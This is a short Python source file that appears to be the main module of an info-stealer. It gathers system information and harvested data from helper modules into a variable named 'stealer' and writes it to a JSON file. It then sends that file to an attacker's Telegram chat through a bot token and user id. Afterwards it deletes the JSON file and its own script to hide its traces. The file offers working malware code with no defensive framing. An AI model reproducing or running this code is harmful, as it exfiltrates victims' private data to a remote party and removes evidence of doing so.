import os
from json import dump
from telebot import TeleBot
from sysinfo import dict_info
from data import dict_data
from colorama import Fore, Style
from config import start, start_text, token, user_id


def main():
    if token and user_id:
        send(token, user_id)
    else:
        print(Fore.RED,start ,Style.RESET_ALL,
              Fore.YELLOW,start_text, Style.RESET_ALL)



def send(token, user_id):
    stealer = dict_info() | dict_data()

    with open('data.json', 'w') as file:
        dump(stealer, file, ensure_ascii=False ,indent=4)

    bot = TeleBot(token)

    with open('data.json', 'rb') as file:
        bot.send_document(user_id, file)

    os.remove('data.json')
    
    bot.polling(none_stop=True)

    return os.remove(os.path.realpath(__file__))

if __name__ == "__main__":
    main()
